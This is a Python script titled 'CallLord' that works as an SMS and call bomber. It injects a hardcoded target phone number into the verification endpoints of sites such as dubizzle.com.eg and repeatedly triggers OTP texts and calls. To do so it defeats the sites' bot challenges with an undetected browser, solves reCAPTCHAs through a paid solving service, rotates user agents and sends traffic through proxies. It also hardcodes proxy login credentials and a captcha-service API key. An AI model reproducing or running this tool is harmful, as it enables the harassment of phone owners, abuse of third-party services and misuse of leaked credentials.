from Initializer import workerObject, targetObject
from rich import print
from rich.pretty import pprint
from rich.pretty import Pretty
from rich.spinner import Spinner
from rich.console import Console
from rich.layout import Layout
from rich.text import Text
from rich.live import Live
from rich.console import Group
from rich.table import Table
from rich.console import Console
from rich.panel import Panel
from random_user_agent.params import SoftwareName, OperatingSystem
from random_user_agent.user_agent import UserAgent
from twocaptcha import TwoCaptcha
from seleniumwire import webdriver  
from selenium.webdriver.common.by import By
from seleniumwire.undetected_chromedriver.v2 import Chrome, ChromeOptions
from requests import Request, Session
import tqdm
import random
import requests
import cloudscraper
import threading
import json
import time
import datetime

#global variables
target_list_objs = []

error_log = []
username = 'sprox0'
password = 'nuzqMTHl4i6c95iMjw'
proxy = f"https://{username}:{password}@gate.smartproxy.com:20000"
solver = TwoCaptcha('feff5f62d5a6737c2dc45946d1854e80')

target_stats_ui = Table("Target", "Call Hits", "Call Miss", "Call Total", "SMS Hits", "SMS Miss", "SMS Total").grid(expand=True)
sample_header = {
"Host":"auth.dubizzle.com.eg",
"Sec-Ch-Ua": "",
"Accept":"application/json",
"Content-Type":"application/json",
"Sec-Ch-Ua-Mobile":"?0",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
"Sec-Ch-Ua-Platform":"",
"Origin":"https://www.dubizzle.com.eg",
"Sec-Fetch-Site":"same-site",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Dest":"empty",
"Referer":"https://www.dubizzle.com.eg/",
"Accept-Encoding":"gzip, deflate",
"Accept-Language":"en-US,en;q=0.9"
}

def generate_target_stats_ui(targets) -> Table:
    global error_log
    global target_list_objs
    image = """
   ______      ______                   __
  / ____/___ _/ / / /   ____  _________/ /
 / /   / __ `/ / / /   / __ \/ ___/ __  / 
/ /___/ /_/ / / / /___/ /_/ / /  / /_/ /  
\____/\__,_/_/_/_____/\____/_/   \__,_/   
                                  by g.
    """
    image = Text(image, justify="center", style="bold red")
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=8),
        Layout(name="main", ratio=2),
    )

    layout["header"].update(image)
    layout["main"].split_column(
        Layout(name="top", size=4),

        Layout(name="mid",size=5),
        Layout(name="bottom",size=5),
        
    )
    
    target_table = Table("Number","SMS Hit", "SMS Fail", "Call Fail", "Hit Fail", "Total", expand=True, box=None)
    worker_table = Table("Worker","Mode","HTTP" ,"Hit", "Miss", "Total", "DPC", "DPB", "Burst", "Req. PB", expand=True, box=None)
    error_table = Table("Log", expand=True, box=None)
    
    for number in target_list_objs:
        
        target_table.add_row(
            str(number.num),str(number.sms_hit),str(number.sms_miss),str(number.call_hit),str(number.call_miss),str(number.count),
        )

        for worker in number.sms_workers_allocated:
            #parameter_display =  Pretty(worker.workerParameters)
            spinner_display = Spinner("aesthetic", text=worker.workerName, style=None, speed=1.0)
            worker_table.add_row(
                spinner_display if worker.workerStateRunning else f"[bold red]{worker.workerName}[/bold red]",
                str(worker.workerMode),str(worker.workerType),f"[bold green]{str(worker.hit)}[/bold green]",f"[bold red]{str(worker.miss)}[/bold red]",f"[bold]{str(worker.total)}[/bold]",str(worker.workerDPC),str(worker.workerDPB),str(worker.burst),str(worker.workerMax))
            #worker_table.add_row(parameter_display)
        for worker in number.call_workers_allocated:
            parameter_display =  Pretty(worker.workerParameters)
            worker_table.add_row(
                f"[bold green]{worker.workerName}[bold green]" if worker.workerStateRunning else f"[bold red]{worker.workerName}[/bold red]",
                str(worker.workerMode),str(worker.workerType),f"[bold green]{str(worker.hit)}[/bold green]",f"[bold red]{str(worker.miss)}[/bold red]",f"[bold]{str(worker.total)}[/bold]",str(worker.workerDPC),str(worker.workerDPB),str(worker.burst),str(worker.workerMax))

    for item in error_log:
        error_table.add_row(
            item
        ) 
    layout["top"].update(target_table)
    layout["mid"].update(worker_table)
    
    layout["bottom"].update(error_table)
    
    return layout

def seleniumBypass(new_worker) :
    global error_log
    cookie_dict = {}
    s = Session()
    chrome_options = ChromeOptions()
    driver = Chrome(options=chrome_options)

    driver.header_overrides = new_worker.workerHeader
    new_headers = {}
    s.get('https://www.dubizzle.com.eg')    
    driver.get("https://www.dubizzle.com.eg")
    time.sleep(10)
    driver.find_element(By.CLASS_NAME, '_1b04dcc1').click()
    for request in driver.requests:
        if request.response:
            if request.url == 'https://www.dubizzle.com.eg/.humbucker/challenge/js/generate/script':
                pre_headers = request.response.headers
                error_log.append(f"[{datetime.datetime.now()}]\t{new_worker.workerName}|\t{request.url}\t{request.response.status_code}")
            if request.url == 'https://www.dubizzle.com.eg/.humbucker/challenge/js/validate':
                set_cookie=request.response.headers['set-cookie'] if 'set-cookie' in request.response.headers else None
                headers_dict = request.response.headers
                error_log.append(f"[{datetime.datetime.now()}]\t{new_worker.workerName}|\t{request.url}\t{request.response.status_code}")
            #new_worker.workerHeader = request.headers
        #print(new_worker.workerHeader)
    if set_cookie:
        secret = set_cookie.split('=')[1] 
        secret_length = len(secret)
        secret = secret[:secret_length-7]
        error_log.append(f"[bold red]{secret}[/bold red]")
    for cookie in driver.get_cookies():
        c = {cookie['name']: cookie['value']}
        s.cookies.update(c)
    driver.close()
    return c, new_worker

def initialize_targets(targets) :
    global target_list_objs
    for target in targets:
        new_target = targetObject(target, 10)
        new_target.sms_workers_allocated,new_target.call_workers_allocated = initialize_workers(new_target)
        target_list_objs.append(new_target)

def initialize_workers(target) : 
    workers_ = json.loads(open("workers.json").read())  #read json file
    enabled_workers = [worker for worker in workers_ if worker['workerIsActive'] == "True"]
    for worker in enabled_workers:
        new_worker = workerObject(
            worker['workerName'], worker['workerMode'],worker['workerType'],
            worker['workerDPC'],worker['workerDPB'],worker['burst'],
            worker['workerMax'],worker['workerURL'],worker['workerBypassMethod'],
            worker['workerStatus'], worker['workerIsActive'],worker['workerHeader'],
            worker['workerParameters'],worker['workerSuccessText']['status_text'],
            worker['workerPrefix'],worker['google_token'],worker['seleniumBypass'])
        
        new_worker.workerParameters = assignTarget(new_worker, target)
        target.all_workers_allocated.append(new_worker)
    sms_workers = [worker for worker in target.all_workers_allocated if worker.workerMode == "SMS"]
    call_workers = [worker for worker in target.all_workers_allocated if worker.workerMode == "CALL"]
    target.sms_workers_allocated = sms_workers
    target.call_workers_allocated = call_workers
    return target.sms_workers_allocated, target.call_workers_allocated

def getUserAgent():
    software_names = [SoftwareName.CHROME.value]
    operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
    user_agent_rotator = UserAgent(
        software_names=software_names, operating_systems=operating_systems, limit=100
    )
    return user_agent_rotator.get_random_user_agent()

def assignTarget(worker, _target):
    for key,value in worker.workerParameters.items():
        if '#target' in value:
            worker.workerParameters[key] = worker.workerPrefix+_target.num
    for key,value in worker.workerHeader.items():
        if '#userAgent' in value:
            worker.workerHeader[key] = getUserAgent()
    return worker.workerParameters

def sendAPIRequest(target,worker,live):
    global error_log
    try:
    
        #if 'Content-Type' in worker.workerHeader and 'application/json' in worker.workerHeader['Content-Type']:
            
        print("Sending..")
        if worker.seleniumBypass != 0:
            cookie,worker = seleniumBypass(worker)
        worker.workerHeader['Content-Length'] = str(len(str(worker.workerParameters)))
        print(cookie)
        if worker.workerType == "GET":
            with requests.get(worker.workerURL, headers=worker.workerHeader, params=worker.workerParameters, stream=True, verify=False,cookies=cookie) as r:
                error_log.append(f"[{datetime.datetime.now()}]\t{worker.workerName}|\t{r.status_code}\n{r.text}")
        elif worker.workerType == "POST":
            with requests.post(worker.workerURL, headers=worker.workerHeader, json=worker.workerParameters, stream=True, verify=False,cookies=cookie ) as r:
                error_log.append(f"[{datetime.datetime.now()}]\t{worker.workerName}|\t{r.status_code}\n{r.text}")
        
        print(r.text)
        if worker.workerSuccessText in r.text:
            worker.hit += 1
            if worker.workerMode == 'SMS':
                target.sms_hit += 1
            elif worker.workerMode == 'CALL':
                target.call_hit += 1
        else:
            worker.miss += 1
            if worker.workerMode == 'SMS':
                target.sms_miss += 1
            elif worker.workerMode == 'CALL':
                target.call_miss += 1       
        live.update(generate_target_stats_ui(target_list_objs))
    except Exception as e:
        error_log.append(f"[{datetime.datetime.now()}]\t{worker.workerName}|\t{e}")
        print(e)
        live.update(generate_target_stats_ui(target_list_objs))
    return target,worker
    
def prepare_request(worker) :
    
    

    #Solve Captcha First
    if worker.google_token != 0:
        solved_captcha_token = solver.recaptcha(sitekey=worker.google_token,
                        url='dubizzle.com.eg',
                        param1=...)
        for k,v in worker.workerParameters.items():
            if '#captchaToken' in v:
                worker.workerParameters[k] = solved_captcha_token

    return worker

def start_attack_cycle(target,worker,live):
    sent = 0
    while (sent < int(worker.burst)) :
        worker = prepare_request(worker)
        target,worker = sendAPIRequest(target,worker,live)
        sent += 1
        print(f"Sent {sent} requests")
    return target,worker 
def sms_thread_manager(target, live) :
    print("SMS Thread Manager Started")
    for worker in target.sms_workers_allocated:
            worker.workerStateRunning = True
            while(int(worker.total) < int(worker.workerMax)):
                target, worker = start_attack_cycle(target, worker, live)
                worker.workerStateRunning = False
                time.sleep(int(worker.workerDPB))

def call_thread_manager(target, live) :
    print("Call Thread Manager Started")
    for worker in target.call_workers_allocated:
            worker.workerStateRunning = True
            while(int(worker.total) < int(worker.workerMax)):
                target, worker = start_attack_cycle(target, worker, live)
                live.update(generate_target_stats_ui(target_list_objs))
                worker.workerStateRunning = False
                time.sleep(int(worker.workerDPB))


def sort_threads(target, options, live) :
    threads = []
    if "sms" in options  :
        sms_thread = threading.Thread(target=sms_thread_manager, args=(target, live))
        threads.append(sms_thread)
    elif "call" in options :
        call_thread_manager(target, live)
def main():
    global target_list_objs
    targets = "01010146621"

    options = ["call"]
    target_list = targets.split(",")
    initialize_targets(target_list)
    #use target_object_list only
    target_threads = []
    with Live(generate_target_stats_ui(target_list_objs), refresh_per_second=4) as live:
        print("[bold]Press any key to begin.[/bold]")
        input()
        for target in target_list_objs:
            sort_threads(target, options, live)

if __name__ == "__main__":
    main()
